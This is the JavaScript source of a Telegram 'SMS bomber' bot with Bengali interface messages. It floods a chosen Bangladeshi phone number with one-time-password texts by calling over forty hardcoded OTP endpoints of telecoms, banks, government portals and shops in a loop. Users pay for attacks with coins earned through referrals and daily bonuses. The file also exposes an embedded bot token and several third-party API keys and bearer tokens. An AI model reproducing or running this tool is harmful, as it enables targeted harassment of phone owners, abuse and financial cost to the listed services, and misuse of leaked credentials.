const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Setup
const DATA_DIR = './database';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
const DB_FILE = `${DATA_DIR}/users.json`;
const HISTORY_FILE = `${DATA_DIR}/history.json`;
const RN_FILE = `${DATA_DIR}/restricted.json`;

let userData = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE)) : {};
let historyData = fs.existsSync(HISTORY_FILE) ? JSON.parse(fs.readFileSync(HISTORY_FILE)) : [];
let restrictedNumbers = fs.existsSync(RN_FILE) ? JSON.parse(fs.readFileSync(RN_FILE)) : [];

function saveData() {
    fs.writeFileSync(DB_FILE, JSON.stringify(userData, null, 2));
    fs.writeFileSync(HISTORY_FILE, JSON.stringify(historyData, null, 2));
    fs.writeFileSync(RN_FILE, JSON.stringify(restrictedNumbers, null, 2));
}

// Render server
const app = express();
app.get('/', (req, res) => res.send('Bot is Running!'));
app.listen(process.env.PORT || 3000);

// API List (পূর্বের সকল API এখানে থাকবে)
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info']
]).resize();

// Helpers
async function autoDelete(ctx, msgId, delay = 300000) {
    setTimeout(async () => {
        try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, delay);
}

function registerUser(ctx) {
    const uid = ctx.from.id;
    if (!userData[uid]) {
        userData[uid] = { name: ctx.from.first_name, coins: 50, lastBonus: 0, totalRequests: 0, bannedUntil: 0 };
        saveData();
        return true;
    }
    return false;
}

function isBanned(uid) {
    return userData[uid]?.bannedUntil > Date.now();
}

// Commands & Handlers
bot.start(async (ctx) => {
    const uid = ctx.from.id;
    const isNew = registerUser(ctx);
    const refBy = ctx.startPayload;
    if (isNew && refBy && userData[refBy] && refBy != uid) {
        userData[refBy].coins += 100;
        ctx.telegram.sendMessage(refBy, `🎊 নতুন রেফারেল! আপনি ১০০ কয়েন পেয়েছেন।`);
    }
    const msg = await ctx.reply(`👋 স্বাগতম ${ctx.from.first_name}!\nআপনার UID: <code>${uid}</code>\nরেফার লিংক: <code>https://t.me/${ctx.botInfo.username}?start=${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

// Balance Command & Button
const sendBalance = async (ctx) => {
    registerUser(ctx);
    const msg = await ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins} কয়েন`);
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
};
bot.command('balance', sendBalance);
bot.hears('💰 Balance', sendBalance);

// Info Command & Button
const sendInfo = async (ctx) => {
    registerUser(ctx);
    const msg = await ctx.reply(`👤 নাম: ${ctx.from.first_name}\n🆔 UID: <code>${ctx.from.id}</code>\n🚀 মোট রিকোয়েস্ট: ${userData[ctx.from.id].totalRequests}\n👤 এডমিন: @Tnayem48`, { parse_mode: 'HTML' });
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
};
bot.command('info', sendInfo);
bot.hears('ℹ️ Info', sendInfo);

// Bonus Command & Button
const sendBonus = async (ctx) => {
    const uid = ctx.from.id;
    if (isBanned(uid)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
    const diff = (Date.now() - (userData[uid].lastBonus || 0)) / (1000 * 60 * 60);
    if (diff >= 24) {
        userData[uid].coins += 50;
        userData[uid].lastBonus = Date.now();
        saveData();
        ctx.reply("✅ ৫০ কয়েন বোনাস পেয়েছেন!");
    } else {
        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
    }
};
bot.command('ck', sendBonus);
bot.hears('🎁 Daily Bonus', sendBonus);

// Boom Logic
const startBoomWorkflow = async (ctx) => {
    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান!");
    ctx.session = { step: 'get_phone' };
    ctx.reply("📱 বোম্বিং নম্বরটি দিন:");
};

bot.command('boom', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length === 3) {
        startBombing(ctx, args[1], parseInt(args[2]));
    } else {
        startBoomWorkflow(ctx);
    }
});
bot.hears('🚀 Boom', startBoomWorkflow);

bot.command('bm', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length === 3) startBombing(ctx, args[1], parseInt(args[2]));
});

// Admin Commands
bot.command('recharge', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1], amount = parseInt(args[2]);
    if (userData[target]) { userData[target].coins += amount; saveData(); ctx.reply("✅ আপডেট হয়েছে।"); }
});

bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const input = ctx.message.text.split(' ')[1];
    if (input.startsWith('-')) restrictedNumbers = restrictedNumbers.filter(n => n !== input.substring(1));
    else restrictedNumbers.push(input);
    saveData(); ctx.reply("✅ নিষিদ্ধ তালিকা আপডেট হয়েছে।");
});

bot.command('history', (ctx) => {
    const uid = ctx.from.id;
    const records = (uid === ADMIN_ID ? historyData : historyData.filter(h => h.uid === uid)).slice(-10).reverse();
    let text = "📜 **হিস্টরি:**\n";
    records.forEach(r => text += `• ${r.phone} | ${r.amount} | ${new Date(r.time).toLocaleTimeString()}\n`);
    ctx.reply(text, { parse_mode: 'Markdown' });
});

// Main Bombing Function
async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    if (restrictedNumbers.includes(phone)) return ctx.reply("❌ এই নম্বরটি প্রটেক্টেড!");
    if (userData[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");
    if (isNaN(amount) || amount > 100) return ctx.reply("❌ সর্বোচ্চ ১০০টি সম্ভব।");

    const statusMsg = await ctx.reply(`🚀 ${phone} নম্বরে কাজ শুরু...`);
    let success = 0, errors = 0, apiIdx = 0;

    while (success < amount) {
        const api = SMS_APIS[apiIdx % SMS_APIS.length];
        apiIdx++;
        try {
            const config = { method: api.method, url: api.url, headers: api.headers || {}, timeout: 5000,
                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone) };
            await axios(config); success++;
        } catch (e) { errors++; }
        await new Promise(r => setTimeout(r, 150));
        if (apiIdx > amount + 300) break;
    }

    userData[uid].coins -= amount;
    userData[uid].totalRequests += 1;
    historyData.push({ uid, phone, amount, time: Date.now() });
    saveData();
    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 ব্যালেন্স: ${userData[uid].coins}`);
    autoDelete(ctx, statusMsg.message_id); autoDelete(ctx, finalMsg.message_id);
}

// Global Text Handler for Workflow
bot.on('message', async (ctx) => {
    if (ctx.session?.step === 'get_phone') {
        if (/^01[3-9]\d{8}$/.test(ctx.message.text)) {
            ctx.session.phone = ctx.message.text;
            ctx.session.step = 'get_amount';
            ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
        } else ctx.reply("❌ সঠিক নম্বর দিন।");
    } else if (ctx.session?.step === 'get_amount') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

bot.launch().then(() => console.log("Bot Updated & Running!"));
